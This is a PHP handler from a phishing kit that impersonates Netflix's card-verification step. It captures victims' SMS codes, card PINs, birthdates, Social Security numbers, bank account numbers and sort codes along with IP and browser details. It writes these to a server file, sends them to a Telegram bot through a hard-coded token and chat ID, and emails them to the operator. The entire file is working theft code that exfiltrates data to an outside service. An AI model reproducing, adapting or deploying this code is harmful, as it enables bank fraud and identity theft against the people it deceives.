<?php
/*  

 /$$$$$$$                           /$$          
| $$__  $$                         | $$          
| $$  \ $$ /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$ 
| $$$$$$$/|____  $$| $$__  $$ /$$__  $$ |____  $$
| $$____/  /$$$$$$$| $$  \ $$| $$  | $$  /$$$$$$$
| $$      /$$__  $$| $$  | $$| $$  | $$ /$$__  $$
| $$     |  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$
|__/      \_______/|__/  |__/ \_______/ \_______/
                                                 
                                                 
                                                                                                                
                                                               



*/
if (isset($_POST['thd']) && isset($_POST['dob_day'])) {
    session_start();
    include '../mine.php';
		$msg .= "


 ⚜️ NETFLIX VBV ⚜️
 ⚜️ NETFLIX VBV BY 🚦☠️ MrxGold ☠️🚦 ⚜️
 🕵VBV OF USER 🕵 : {$_SESSION['fname']}\n
🔑 SMS 🔑 : {$_POST['thd']}\n
🔑 PIN 🔑 : {$_POST['pin']}\n
🎂 BIRTHDATE 🎂 : {$_POST['dob_day']}/{$_POST['dob_month']}/{$_POST['dob_year']}\n
***********🌐 IP LOOKUP INFORMATION 🌐************\n
💻 Computer 💻 : {$_SESSION['computer']}
🌐 IP 🌐 : {$_SESSION['ip']}
🌆 City 🏙 : {$_SESSION['ip_city']} , {$_SESSION['ip_state']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
🌐 Browser 🌐 : {$_SESSION['browser']}
☠️ Brows OS ☠️ : {$_SESSION['browser']} on {$_SESSION['os']}
👴 User Agent 👴 : {$_SERVER['HTTP_USER_AGENT']}
⏳ Time ⏳ : {$_SESSION['ip_timezone']}\n
  ⚜️ NETFLIX BY 🚦☠️ MrxGold ☠️🚦 ⚜️ 

\n";		
if(isset($_POST['ssn'])){$msg.="SSN            : {$_POST['ssn']}\r\n";}
if(isset($_POST['acn'])){$msg.="ACOUNT NUM. : {$_POST['acn']}\r\n";$msg.="SORT CODE   : {$_POST['scode']}\r\n";}
if($saveintext=="yes"){
    $save=fopen("../../".$filename.".html","a+");
    fwrite($save,$msg);
    fclose($save);

    $token = "5736963104:AAE72-kHhwYexqulDmPMMhuum_7g5nB-Txw";

$data = [
    'text' => $msg,$coder,
    'chat_id' => '-684676837'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

}
$subject=" 💰 NETFLIX VBV 💰  From [{$_SESSION['ip_countryName']}]  [{$_SESSION['ip']}] ";$headers="From: ⚜️ Netflix ⚜️ <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtoemail=="yes"){foreach(explode(",",$yours)as $your){@mail($your,$subject,$msg,$headers);}}
exit('done');}
?>